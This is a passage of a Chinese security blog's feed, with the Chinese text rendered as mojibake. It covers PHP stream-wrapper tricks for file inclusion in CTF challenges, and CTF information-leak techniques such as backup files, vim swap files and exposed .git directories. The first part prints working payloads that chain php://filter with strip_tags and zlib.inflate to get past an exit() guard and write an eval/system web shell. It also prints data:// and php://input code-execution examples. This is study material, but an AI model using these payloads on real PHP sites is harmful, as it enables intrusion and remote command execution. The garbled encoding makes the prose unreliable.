eval($_GET[a]);?&gt;/resource=shell.php</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å­˜åœ¨æ­»äº¡exitï¼Œé€šè¿‡strip_tagsç»•è¿‡ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/write=string.strip_tags|zlib.inflate|&lt;?php eval($_GET[a]);?&gt;/resource=shell.php</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¼ å…¥ä¸€å¥è¯æœ¨é©¬çš„è¿‡æ»¤å™¨ä½¿ç”¨äº†æ²¡æœ‰è¢«è¿‡æ»¤çš„ <code>zlib.inflate</code>ï¼Œè¿™æ ·å°±å¯ä»¥å†™å…¥ä¸€å¥è¯æœ¨é©¬äº†ã€‚</p><h4 id="ä¸€ç‚¹å›°æƒ‘"><a href="#ä¸€ç‚¹å›°æƒ‘" class="headerlink" title="ä¸€ç‚¹å›°æƒ‘"></a>ä¸€ç‚¹å›°æƒ‘</h4><p>ç„¶é¹…å®é™…wpæ˜¯è¿™æ ·å­çš„ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/write=string.strip_tags|zlib.inflate|?&gt;&lt;?php eval($_GET[a]);?&gt;&lt;?/resource=shell.php</span></span><br></pre></td></tr></table></figure><p>åœ¨ä»£ç çš„å¼€å¤´å’Œç»“å°¾éƒ½å¤šäº†?&gt;&lt;?çš„ã€‚æˆ‘èµ·å…ˆæƒ³çš„æ˜¯é—­åˆå‰é¢çš„æ ‡ç­¾ï¼Œç­‰ä¸»åŠæ–¹æ”¾ä¸ªdockerç¯å¢ƒå¤ç°çš„æ—¶å€™æµ‹è¯•ä¸€ä¸‹è‡ªå·±çš„é—®é¢˜å•¦~æœ‰å¸ˆå‚…çŸ¥é“çš„ä¹Ÿå¯ä»¥è¯„è®ºä¸€ä¸‹ï¼Œæ„Ÿæ¿€ä¸å°½ï¼</p><hr><h4 id="å¦ä¸€ç§åšæ³•"><a href="#å¦ä¸€ç§åšæ³•" class="headerlink" title="å¦ä¸€ç§åšæ³•"></a>å¦ä¸€ç§åšæ³•</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/iconv|UCS|UTF|rot|quoted|base64|%|toupper|tolower|dechunk|\.\./i&#x27;</span>),<span class="variable">$content</span>);</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;hacker&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$content</span>))</span><br><span class="line"><span class="keyword">require_once</span>(<span class="variable">$content</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$content</span>,<span class="string">&#x27;&lt;?php exit();&#x27;</span>.<span class="variable">$content</span>);</span><br></pre></td></tr></table></figure><p>ç®€å•ä»£ç å®¡è®¡ä¸€æ³¢ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡file_put_contentså‡½æ•°ç”Ÿæˆæ–‡ä»¶ï¼Œä½†æ˜¯æœ‰ä¸ª&lt;?php exit();æ‰€ä»¥åˆ›å»ºæœ¨é©¬ä¹Ÿæ²¡ç”¨ï¼Œæ‰€ä»¥éœ€è¦ç»•è¿‡ä»–,å¯ä»¥é€šè¿‡filterè¿‡æ»¤å™¨æ¥è¿›è¡Œè¿‡æ»¤ï¼Œé€šè¿‡ä»£ç æŸ¥çœ‹å‘ç°strip_tagsæ²¡æœ‰è¿‡æ»¤ï¼Œä¹Ÿæ²¡æœ‰è¿‡æ»¤zlib.inflate<br>å› æ­¤æ„é€ payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="string">&quot;?&gt;&quot;</span>.<span class="title function_ invoke__">gzdeflate</span>(<span class="string">&#x27;&lt;?php system($_GET[_]);?&gt;&#x27;</span>)).<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆ<code>%3F%3E%B3%B1%2F%C8%28P%28%AE%2C.I%CD%D5P%89ww%0D%89%8E%8F%D5%B4%B6%B7%03%00</code><br>ä¼šå‘ç°å…¶ä¸­æœ‰æ²¡æœ‰urlç¼–ç çš„å­—ç¬¦æ¯”å¦‚<code>.I</code>æ²¡æœ‰å…³ç³»ï¼Œä½†æ˜¯<code>%00</code>è¦å»æ‰ä¸ç„¶ä¼šæˆªæ–­ï¼Œä»è€Œå†™ä¸äº†æ–‡ä»¶<br>åŒæ—¶ä½¿ç”¨<code>string.srip_tags</code>æ¥å»é™¤phpå’Œhtmlçš„æ ‡ç­¾ï¼Œå› ä¸ºè¿‡æ»¤å™¨æ˜¯ä»å·¦åˆ°å³æ‰§è¡Œçš„ï¼Œå› æ­¤åœ¨æˆ‘ä»¬çš„payloadä½¿ç”¨zlibè§£å‹å‰ä¸ä¼šè¢«å»é™¤æ ‡ç­¾ï¼Œå› æ­¤å¯ä»¥æ„é€ ä»¥ä¸‹payload<br><code>php://filter/write=string.strip\_tags|zlib.inflate|%3F%3E%b3%b1%2f%c8%28%50%28%ae%2c%2e%49%cd%d5%50%89%77%77%0d%89%8e%8f%d5%b4%b6%b7%03%3C%3F/resource.php=idlab.php</code></p><p>ä¼ å…¥<code>_</code>å‚æ•°å³å¯æ‰§è¡Œå‘½ä»¤<br><img src="https://hackerqwq.github.io/2020/04/27/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%B0%8F%E6%80%BB%E7%BB%93/7.png"></p><h4 id="base64-decodeå†™å…¥"><a href="#base64-decodeå†™å…¥" class="headerlink" title="base64-decodeå†™å…¥"></a>base64-decodeå†™å…¥</h4><p>ä½¿ç”¨convert.base64-encodeç­›é€‰å™¨å†™å…¥ä¹Ÿå¯ä»¥,ä½†æ˜¯è¦æ³¨æ„ç¼–ç çš„æ—¶å€™æ˜¯8ä¸ªå­—ç¬¦ä¸€ç»„</p><p><code>php://filter/write=convert.base64-decode/resource=shsell.php</code></p><h2 id="php-x2F-x2F-input-x2F"><a href="#php-x2F-x2F-input-x2F" class="headerlink" title="php:&#x2F;&#x2F;input&#x2F;"></a><a href="#php-input" title="php://input/"></a>php:&#x2F;&#x2F;input&#x2F;</h2><p>ä½¿ç”¨POSTä¸Šä¼ PHPä»£ç å¹¶æ‰§è¡Œ<br>ä¸‹é¢ç”±äºæœåŠ¡å™¨è¿‡æ»¤äº†å¯¼è‡´æ— æ³•æ‰§è¡Œ</p><p><img src="https://hackerqwq.github.io/2020/04/27/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%B0%8F%E6%80%BB%E7%BB%93/6.png"></p><h2 id="phpå…¶ä»–ç”¨æ³•"><a href="#phpå…¶ä»–ç”¨æ³•" class="headerlink" title="phpå…¶ä»–ç”¨æ³•"></a><a href="#php%E5%85%B6%E4%BB%96%E7%94%A8%E6%B3%95" title="phpå…¶ä»–ç”¨æ³•"></a>phpå…¶ä»–ç”¨æ³•</h2><table><thead><tr><th align="center">åè®®</th><th align="center">ä½œç”¨</th></tr></thead><tbody><tr><td align="center">php:&#x2F;&#x2F;input</td><td align="center">å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œåœ¨POSTè¯·æ±‚ä¸­è®¿é—®POSTçš„dataéƒ¨åˆ†ï¼Œåœ¨enctype&#x3D;â€multipart&#x2F;form-dataâ€ çš„æ—¶å€™php:&#x2F;&#x2F;input æ˜¯æ— æ•ˆçš„ã€‚</td></tr><tr><td align="center">php:&#x2F;&#x2F;output</td><td align="center">åªå†™çš„æ•°æ®æµï¼Œå…è®¸ä»¥ print å’Œ echo ä¸€æ ·çš„æ–¹å¼å†™å…¥åˆ°è¾“å‡ºç¼“å†²åŒºã€‚</td></tr><tr><td align="center">php:&#x2F;&#x2F;fd</td><td align="center">(&gt;&#x3D;5.3.6)å…è®¸ç›´æ¥è®¿é—®æŒ‡å®šçš„æ–‡ä»¶æè¿°ç¬¦ã€‚ä¾‹å¦‚ php:&#x2F;&#x2F;fd&#x2F;3 å¼•ç”¨äº†æ–‡ä»¶æè¿°ç¬¦ 3ã€‚</td></tr><tr><td align="center">php:&#x2F;&#x2F;memory php:&#x2F;&#x2F;temp</td><td align="center">(&gt;&#x3D;5.1.0)ä¸€ä¸ªç±»ä¼¼æ–‡ä»¶åŒ…è£…å™¨çš„æ•°æ®æµï¼Œå…è®¸è¯»å†™ä¸´æ—¶æ•°æ®ã€‚ä¸¤è€…çš„å”¯ä¸€åŒºåˆ«æ˜¯ php:&#x2F;&#x2F;memory æ€»æ˜¯æŠŠæ•°æ®å‚¨å­˜åœ¨å†…å­˜ä¸­ï¼Œè€Œ php:&#x2F;&#x2F;temp ä¼šåœ¨å†…å­˜é‡è¾¾åˆ°é¢„å®šä¹‰çš„é™åˆ¶åï¼ˆé»˜è®¤æ˜¯ 2MBï¼‰å­˜å…¥ä¸´æ—¶æ–‡ä»¶ä¸­ã€‚ä¸´æ—¶æ–‡ä»¶ä½ç½®çš„å†³å®šå’Œ sys_get_temp_dir() çš„æ–¹å¼ä¸€è‡´ã€‚</td></tr></tbody></table><h2 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a><a href="#file" title="file://"></a>file:&#x2F;&#x2F;</h2><p>file:&#x2F;&#x2F;å’Œphp:&#x2F;&#x2F;filterå·®ä¸å¤šï¼Œä½†æ˜¯åªèƒ½å†™ç»å¯¹è·¯å¾„</p><p><code>https://www.baidu.com?file=file://C:/ProgramFile/1.txt</code></p><h2 id="phar-x2F-x2F-å’Œzip-x2F-x2F"><a href="#phar-x2F-x2F-å’Œzip-x2F-x2F" class="headerlink" title="phar:&#x2F;&#x2F;å’Œzip:&#x2F;&#x2F;"></a><a href="#phar-%E5%92%8Czip" title="phar://å’Œzip://"></a>phar:&#x2F;&#x2F;å’Œzip:&#x2F;&#x2F;</h2><p><em>phar:&#x2F;&#x2F;å’Œzip:&#x2F;&#x2F;éƒ½å¯ä»¥æŸ¥æ‰¾æŒ‡å®šå‹ç¼©åŒ…å†…çš„æ–‡ä»¶</em></p><p>phar:&#x2F;&#x2F;å¯ä»¥å†™ç»å¯¹è·¯å¾„å’Œç›¸å¯¹è·¯å¾„</p><p><code>https://www.baidu.com?file=phar://C:/ProgramFile/test.zip/1.txt https://www.baidu.com?file=phar://./test.zip/1.txt</code><br>è€Œzip:&#x2F;&#x2F;åªèƒ½å†™ç»å¯¹è·¯å¾„</p><p><code>https://www.baidu.com?file=zip://./text.zip%231.txt</code><br><em>æ³¨æ„è¿™é‡Œçš„#ç”¨äºåˆ†å¼€å‹ç¼©åŒ…å’Œå‹ç¼©åŒ…æ–‡ä»¶å¹¶ä¸”è¢«ç¼–ç æˆ%23</em></p><h2 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a><a href="#data" title="data://"></a>data:&#x2F;&#x2F;</h2><p>dataå’Œinputç±»ä¼¼ï¼Œéƒ½å¯ä»¥ä¼ å…¥PHPä»£ç æ‰§è¡Œ</p><ol><li>data:&#x2F;&#x2F;text&#x2F;plain</li></ol><p><code>https://www.baidu.com?file=data://text/plain,&lt;?php echo &quot;flag&quot;; ?&gt;</code><br>2.  data:&#x2F;&#x2F;text&#x2F;plain;base64,</p><p><code>http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code>    </p><h2 id="http-x2F-x2F"><a href="#http-x2F-x2F" class="headerlink" title="http:&#x2F;&#x2F;"></a><a href="#http" title="http://"></a>http:&#x2F;&#x2F;</h2><p>httpå¯ä»¥ä¼ å…¥å¤–éƒ¨é“¾æ¥</p><p><code>https://www.baidu.com?file=http://www.google.com</code></p><h2 id="zip-x2F-x2F"><a href="#zip-x2F-x2F" class="headerlink" title="zip:&#x2F;&#x2F;"></a><a href="#zip" title="zip://"></a>zip:&#x2F;&#x2F;</h2><p>ä½¿ç”¨<code>zip://</code>åæ‚”è‡ªåŠ¨å°†è¿™ä¸ªZipæ–‡ä»¶æŒ‰ç…§å‹ç¼©æ—¶çš„æ–‡ä»¶ç»“æ„è¿›è¡Œè§£æï¼Œ<br>é€šè¿‡<code>zip://filename%23shell.php</code>çš„å½¢å¼å¯¹Zipå†…éƒ¨å‹ç¼©çš„æ–‡ä»¶è¿›è¡Œç´¢å¼•</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a><a href="#%E6%80%BB%E7%BB%93" title="æ€»ç»“"></a>æ€»ç»“</h1><p>file:&#x2F;&#x2F; php:&#x2F;filter å¯ä»¥è®¿é—®æœ¬åœ°æ–‡ä»¶ï¼ˆfile:&#x2F;&#x2F;è¦ç”¨ç»å¯¹è·¯å¾„ï¼‰<br>zip:&#x2F;&#x2F; phar:&#x2F;&#x2F; å¯ä»¥è®¿é—®å‹ç¼©æ–‡ä»¶ï¼ˆphar:&#x2F;&#x2F;å¯ä»¥ç”¨ç»å¯¹å’Œç›¸å¯¹è·¯å¾„ï¼Œzip:&#x2F;&#x2F;åªèƒ½ç”¨ç»å¯¹è·¯å¾„ï¼‰<br>php:&#x2F;&#x2F;input data:&#x2F;&#x2F; å¯ä»¥ä¼ å…¥æ§åˆ¶ä»£ç ï¼ˆphp:&#x2F;&#x2F;input ç”¨POSTæ–¹æ³•ä¸Šä¼ ï¼Œdata:&#x2F;&#x2F;ç›´æ¥ç”¨urlè¾“å…¥å°±å¯ä»¥ï¼‰</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PHPä¼ªåè®®å°æ€»ç»“&quot;&gt;&lt;a href=&quot;#PHPä¼ªåè®®å°æ€»ç»“&quot; class=&quot;headerlink&quot; title=&quot;PHPä¼ªåè®®å°æ€»ç»“&quot;&gt;&lt;/a&gt;PHPä¼ªåè®®å°æ€»ç»“&lt;/h1&gt;&lt;h1 id=&quot;åˆæ­¥æ¢ç´¢&quot;&gt;&lt;a href=&quot;#åˆæ­¥æ¢ç´¢&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="WEB" scheme="https://lhhxs.github.io/categories/WEB/"/>
    
    
    <category term="web" scheme="https://lhhxs.github.io/tags/web/"/>
    
    <category term="lfi" scheme="https://lhhxs.github.io/tags/lfi/"/>
    
  </entry>
  
  <entry>
    <title>CTFä¸­çš„ä¿¡æ¯æ³„éœ²</title>
    <link href="https://lhhxs.github.io/2022/09/09/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/CTF%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    <id>https://lhhxs.github.io/2022/09/09/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/CTF%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</id>
    <published>2022-09-09T07:48:21.291Z</published>
    <updated>2022-09-09T14:23:06.622Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTFä¸­çš„ä¿¡æ¯æ³„éœ²"><a href="#CTFä¸­çš„ä¿¡æ¯æ³„éœ²" class="headerlink" title="CTFä¸­çš„ä¿¡æ¯æ³„éœ²"></a>CTFä¸­çš„ä¿¡æ¯æ³„éœ²</h1><p>ä¸€èˆ¬å…ˆç”¨dirmapæ‰«ä¸€ä¸‹ï¼Œçœ‹ä¸‹æœ‰æ²¡æœ‰ä¿¡æ¯æ³„éœ²ï¼ŒCTFä¸­ä¸å¤ªå»ºè®®ç”¨å¾¡å‰‘çš„é‚£äº›å­—å…¸ï¼Œå¾ˆå¤šæ²¡ç”¨çš„ä¸å¿…è¦æ‰«</p><blockquote><p>python3 dirmap.py -i <a href="https://target.com/">https://target.com</a> -lcf</p></blockquote><h1 id="ç½‘ç«™å¤‡ä»½æ–‡ä»¶"><a href="#ç½‘ç«™å¤‡ä»½æ–‡ä»¶" class="headerlink" title="ç½‘ç«™å¤‡ä»½æ–‡ä»¶"></a>ç½‘ç«™å¤‡ä»½æ–‡ä»¶</h1><p>åœ¨ç½‘ç«™çš„ä½¿ç”¨è¿‡ç¨‹ä¸­ï¼Œå¾€å¾€éœ€è¦å¯¹ç½‘ç«™ä¸­çš„æ–‡ä»¶è¿›è¡Œä¿®æ”¹ã€å‡çº§ã€‚æ­¤æ—¶å°±éœ€è¦å¯¹ç½‘ç«™æ•´ç«™æˆ–è€…å…¶ä¸­æŸä¸€é¡µé¢è¿›è¡Œå¤‡ä»½ã€‚å½“å¤‡ä»½æ–‡ä»¶æˆ–è€…ä¿®æ”¹è¿‡ç¨‹ä¸­çš„ç¼“å­˜æ–‡ä»¶å› ä¸ºå„ç§åŸå› è€Œè¢«ç•™åœ¨ç½‘ç«™webç›®å½•ä¸‹ï¼Œè€Œè¯¥ç›®å½•åˆæ²¡æœ‰è®¾ç½®è®¿é—®æƒé™æ—¶ï¼Œä¾¿æœ‰å¯èƒ½å¯¼è‡´å¤‡ä»½æ–‡ä»¶æˆ–è€…ç¼–è¾‘å™¨çš„ç¼“å­˜æ–‡ä»¶è¢«ä¸‹è½½ï¼Œå¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œç»™æœåŠ¡å™¨çš„å®‰å…¨åŸ‹ä¸‹éšæ‚£ã€‚</p><p>æ¯”å¦‚æ‰«åˆ°<a href="http://www.zipç­‰,è¿™ç§ä¸€èˆ¬æ˜¯å‡ºé¢˜äººç›´æ¥ç»™ä»£ç è®©ä½ å®¡è®¡äº†/">www.zipç­‰ï¼Œè¿™ç§ä¸€èˆ¬æ˜¯å‡ºé¢˜äººç›´æ¥ç»™ä»£ç è®©ä½ å®¡è®¡äº†</a></p><p>å…¶å®ƒæ ¼å¼</p><blockquote><ul><li>.rar</li><li>.zip</li><li>.7z</li><li>.tar.gz</li><li>.bak</li><li>.txt</li><li>.old</li><li>.temp</li></ul></blockquote><h1 id="vimæ–‡ä»¶"><a href="#vimæ–‡ä»¶" class="headerlink" title="vimæ–‡ä»¶"></a>vimæ–‡ä»¶</h1><blockquote><p>ç¨‹åºå‘˜ä½¿ç”¨vimç¼–è¾‘å™¨ç¼–å†™ä¸€ä¸ª<code>index.php</code>æ–‡ä»¶æ—¶ï¼Œä¼šæœ‰ä¸€ä¸ª<code>.index.php.swp</code>æ–‡ä»¶ï¼Œå¦‚æœæ–‡ä»¶æ­£å¸¸é€€å‡ºï¼Œåˆ™è¯¥æ–‡ä»¶è¢«åˆ é™¤ï¼Œå¦‚æœå¼‚å¸¸é€€å‡ºï¼Œè¯¥æ–‡ä»¶åˆ™ä¼šä¿å­˜ä¸‹æ¥ï¼Œè¯¥æ–‡ä»¶å¯ä»¥ç”¨æ¥æ¢å¤å¼‚å¸¸é€€å‡ºçš„index.phpï¼ŒåŒæ—¶å¤šæ¬¡æ„å¤–é€€å‡ºå¹¶ä¸ä¼šè¦†ç›–æ—§çš„<code>.swp</code>æ–‡ä»¶ï¼Œè€Œæ˜¯ä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„ï¼Œä¾‹å¦‚<code>.swo</code>æ–‡ä»¶ã€‚</p><p>ä»¥ index.php ä¸ºä¾‹ ç¬¬ä¸€æ¬¡äº§ç”Ÿçš„ç¼“å­˜æ–‡ä»¶åä¸º .index.php.swp<br>ç¬¬äºŒæ¬¡æ„å¤–é€€å‡ºåï¼Œæ–‡ä»¶åä¸º.index.php.swo<br>ç¬¬ä¸‰æ¬¡äº§ç”Ÿçš„ç¼“å­˜æ–‡ä»¶åˆ™ä¸º .index.php.swn<br>æ³¨æ„ï¼šindexå‰æœ‰ â€œ . â€œ</p></blockquote><p>å¯ä»¥ç”¨vimçš„æ—¶å€™è¯•ä¸€ä¸‹ï¼Œä¸€èˆ¬éƒ½æ˜¯swpï¼Œä½†æœ‰æ¬¡æ¯”èµ›é‡åˆ°äº†swo</p><p>æ¢å¤æ–‡ä»¶<code>vim -r æ¢å¤çš„æ–‡ä»¶å</code></p><p>é»˜è®¤æƒ…å†µä¸‹ä½¿ç”¨Vimç¼–ç¨‹ï¼Œåœ¨ä¿®æ”¹æ–‡ä»¶åç³»ç»Ÿä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªå¸¦<code>~</code>çš„å¤‡ä»½æ–‡ä»¶ï¼ŒæŸäº›æƒ…å†µä¸‹å¯ä»¥å¯¹å…¶ä¸‹è½½è¿›è¡ŒæŸ¥çœ‹</p><h1 id="gitæºç æ³„æ¼"><a href="#gitæºç æ³„æ¼" class="headerlink" title="gitæºç æ³„æ¼"></a>gitæºç æ³„æ¼</h1><p>èƒ½æ‰«æåˆ°ä»¥ä¸‹ç›®å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://url/.git/</span><br><span class="line">http://url/.git/config </span><br></pre></td></tr></table></figure><p>Gitæ˜¯ä¸€ä¸ªå¼€æºçš„åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œåœ¨æ‰§è¡Œ<code>git init</code>åˆå§‹åŒ–ç›®å½•çš„æ—¶å€™ï¼Œä¼šåœ¨å½“å‰ç›®å½•ä¸‹è‡ªåŠ¨åˆ›å»ºä¸€ä¸ª<code>.git</code>ç›®å½•ï¼Œç”¨æ¥è®°å½•ä»£ç çš„å˜æ›´è®°å½•ç­‰ã€‚å‘å¸ƒä»£ç çš„æ—¶å€™ï¼Œå¦‚æœæ²¡æœ‰æŠŠ<code>.git</code>è¿™ä¸ªç›®å½•åˆ é™¤ï¼Œå°±ç›´æ¥å‘å¸ƒåˆ°äº†æœåŠ¡å™¨ä¸Šï¼Œæ”»å‡»è€…å°±å¯ä»¥é€šè¿‡å®ƒæ¥æ¢å¤æºä»£ç ã€‚</p><p>åˆ©ç”¨<a href="https://github.com/lijiejie/GitHack">GitHack</a>è¿›è¡Œä¿¡æ¯è¯»å–ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py http://url/.git/ </span><br></pre></td></tr></table></figure><p>æˆ–è€…<a href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-git.pl -v -u http://url/.git </span><br></pre></td></tr></table></figure><p>gitç›¸å…³å‘½ä»¤</p><blockquote><p>git logå¯ä»¥æŸ¥çœ‹æäº¤å†å²<br>git diffæŸ¥çœ‹gitæäº¤çš„ä¸åŒå¤„<br>stashå‘½ä»¤å¯ç”¨äºä¸´æ—¶ä¿å­˜å’Œæ¢å¤ä¿®æ”¹ï¼Œå¯è·¨åˆ†æ”¯<br>git stash listæŸ¥çœ‹æ‰€æœ‰ä¿å­˜çš„è®°å½•åˆ—è¡¨<br>git stash popï¼Œä» git æ ˆä¸­å¼¹å‡ºæ¥ä¸€ä¸ªæ–‡ä»¶</p></blockquote><hr><p><strong>git stash çš„ä½œç”¨</strong><br>git stashç”¨äºæƒ³è¦ä¿å­˜å½“å‰çš„ä¿®æ”¹,ä½†æ˜¯æƒ³å›åˆ°ä¹‹å‰æœ€åä¸€æ¬¡æäº¤çš„å¹²å‡€çš„å·¥ä½œä»“åº“æ—¶è¿›è¡Œçš„æ“ä½œ.git stashå°†æœ¬åœ°çš„ä¿®æ”¹ä¿å­˜èµ·æ¥,å¹¶ä¸”å°†å½“å‰ä»£ç åˆ‡æ¢åˆ°HEADæäº¤ä¸Š.</p><p>é€šè¿‡git stashå­˜å‚¨çš„ä¿®æ”¹åˆ—è¡¨,å¯ä»¥é€šè¿‡git stash listæŸ¥çœ‹.git stash showç”¨äºæ ¡éªŒ,git stash applyç”¨äºé‡æ–°å­˜å‚¨.ç›´æ¥æ‰§è¡Œgit stashç­‰åŒäºgit stash save.</p><p>æœ€æ–°çš„å­˜å‚¨ä¿å­˜åœ¨refs&#x2F;stashä¸­.è€çš„å­˜å‚¨å¯ä»¥é€šè¿‡ç›¸å…³çš„å‚æ•°è·å¾—,ä¾‹å¦‚stash@{0}è·å–æœ€æ–°çš„å­˜å‚¨,stash@{1}è·å–æ¬¡æ–°.stash@{2.hour.ago}è·å–ä¸¤å°æ—¶ä¹‹å‰çš„.å­˜å‚¨å¯ä»¥ç›´æ¥é€šè¿‡ç´¢å¼•çš„ä½ç½®æ¥è·å¾—stash@{n}.</p><p><strong>git stashçš„æ¦‚å¿µç†è§£</strong><br>git stashçš„æ¯ä¸ªå­˜å‚¨å•å…ƒåœ¨å·¥ä½œä»“åº“ä¸­æ˜¯é€šè¿‡commitçš„å½¢å¼ç”±æ ‘ç»“æ„å±•ç¤ºçš„.å®ƒçš„æ ¹èŠ‚ç‚¹æ˜¯HEADæ‰€åœ¨çš„æäº¤<br><img src="https://img-blog.csdnimg.cn/20200825145004389.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MjIyMDUw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>1.æ‰“å¼€é¢˜ç›®ç¯å¢ƒ<br><img src="https://img-blog.csdnimg.cn/20200825145326980.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MjIyMDUw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">2.ä½¿ç”¨githackå·¥å…·è¿›è¡Œæ‰«æï¼Œå¦‚ä½•ä½¿ç”¨å¯ä»¥ç™¾åº¦ä¸€ä¸‹ï¼Œæˆ–è€…çœ‹æˆ‘ä¸Šä¸€ç¯‡æ–‡ç« æœ‰æåˆ°ã€‚<br><img src="https://img-blog.csdnimg.cn/20200825145709754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MjIyMDUw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>3.æ‰«æå®Œæˆåï¼Œåœ¨ç›®å½•é‡Œé¢ä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„æ–‡ä»¶ï¼Œè¿›å»ä¹‹åæŒ‰ä½shiftå•æœºé¼ æ ‡å³é”®é€‰æ‹©git base hereï¼Œæ‰§è¡Œgit stash list ï¼šæŸ¥çœ‹stashäº†å“ªäº›å­˜å‚¨ã€‚<br><img src="https://img-blog.csdnimg.cn/20200825150812969.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MjIyMDUw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">4.æ‰§è¡Œgit stash pop</p><blockquote><p>æ¢å¤ä¹‹å‰ç¼“å­˜çš„å·¥ä½œç›®å½•ï¼Œå°†ç¼“å­˜å †æ ˆä¸­çš„å¯¹åº”stashåˆ é™¤ï¼Œå¹¶å°†å¯¹åº”ä¿®æ”¹åº”ç”¨åˆ°å½“å‰çš„å·¥ä½œç›®å½•ä¸‹,é»˜è®¤ä¸ºç¬¬ä¸€ä¸ªstash,å³stash@{0}ï¼Œå¦‚æœè¦åº”ç”¨å¹¶åˆ é™¤å…¶ä»–stashï¼Œå‘½ä»¤ï¼šgit stash pop stash@{$num} ï¼Œæ¯”å¦‚åº”ç”¨å¹¶åˆ é™¤ç¬¬äºŒä¸ªï¼šgit stash pop stash@{1}ï¼‰</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200825150955455.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MjIyMDUw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">5.ç›®å½•ä¸‹ç”Ÿæˆäº†æ–°çš„txtæ–‡ä»¶ ï¼Œæˆ‘ä»¬æŸ¥çœ‹è·å–flagã€‚<img src="https://img-blog.csdnimg.cn/20200825151253183.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MjIyMDUw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><hr><h1 id="CTFHub-Gitæ³„éœ²-Log"><a href="#CTFHub-Gitæ³„éœ²-Log" class="headerlink" title="CTFHub-Gitæ³„éœ²-Log"></a>CTFHub-Gitæ³„éœ²-Log</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" 